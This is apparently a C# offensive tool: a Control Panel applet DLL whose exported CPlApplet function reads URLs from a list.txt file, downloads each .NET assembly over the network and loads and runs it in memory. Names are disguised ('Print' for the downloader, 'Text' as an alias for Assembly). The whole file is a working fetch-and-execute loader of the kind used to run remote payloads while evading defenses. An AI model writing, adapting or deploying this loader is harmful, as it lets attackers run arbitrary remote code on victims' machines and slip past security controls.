using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System.IO;
using Text = System.Reflection.Assembly;
using System.Linq;

namespace CPL
{
    public class Class1
    {
        const uint ATTACH_PARENT_PROCESS = 0x0ffffffff;  // default value if not specifing a process ID
        const int ERROR_ACCESS_DENIED = 5; // process was already attached to another console
        public static string files = "list.txt";
        const int DLL_PROCESS_ATTACH = 0;
        const int DLL_PROCESS_DETACH = 3;
        const int DLL_THREAD_ATTACH = 1;
        const int DLL_THREAD_DETACH = 2;

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool AttachConsole(uint dwProcessID);

        [DllImport("kernel32", SetLastError = true)]
        static extern bool AllocConsole();
        private static void AllocateConsole()
        {
            //
            // the following should only be used in a non-console application type (C#)
            // (since a console is allocated/attached already when you define a console app.. :) )
            //
            if (!AttachConsole(ATTACH_PARENT_PROCESS) && Marshal.GetLastWin32Error() == ERROR_ACCESS_DENIED)
            {
                // A console was not allocated, so we need to make one.
                if (!AllocConsole())
                {
                    MessageBox.Show("A console could not be allocated, sorry!");
                    throw new Exception("Console Allocation Failed");
                }
                else
                {
                    Console.WriteLine("Is Attached, press a key...");
                    Console.ReadKey(true);
                    // you now may use the Console.xxx functions from .NET framework
                    // and they will work as normal
                }

            }
        }

        static Text Print(string url, int retry, int timeout)
        {
            Console.WriteLine($"{url}");

            // If https desired
            // ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            WebClient client = new WebClient();
            byte[] str = null;
            while (retry >= 0 && str == null)
            {
                try
                {
                    str = client.DownloadData(url);
                }
                catch (WebException ex)
                {
                    retry--;
                    Thread.Sleep(timeout * 10000);
                }
            }
            if (str == null)
            {
                Environment.Exit(-1);
            }
            // Console.WriteLine(str[0]);
            Text second = Text.Load(str);

            return second;
        }

         [DllExport]
        public static int CPlApplet(int a, int b, string c, int d)
        {
            AllocateConsole();

            // Check if list.txt config file exists           
            string configfile = Path.GetFullPath(files);
            if (File.Exists(files))
            {
                Console.WriteLine("[+] {0} found, processing list of files", files);
                string[] executables = File.ReadAllLines(configfile);
                foreach (string file in executables)
                {
                    Console.WriteLine("[+] Processing {0}", file);
                    string[] words = file.Split(' ');
                    
                    Text text = Print(words[0], 3, 1);

                    string[] args = new string[] { null };
                    if (words.Length > 1)
                        args = words.Skip(1).ToArray();

                    text.EntryPoint.Invoke(null, new object[] { args });
                    Console.WriteLine("[+] Finished");
                }
            }
            else
            {
                Console.WriteLine("[-] File not found.");
            }
            Console.WriteLine("[+] Done executing");
            return 0;
        }
    }
}
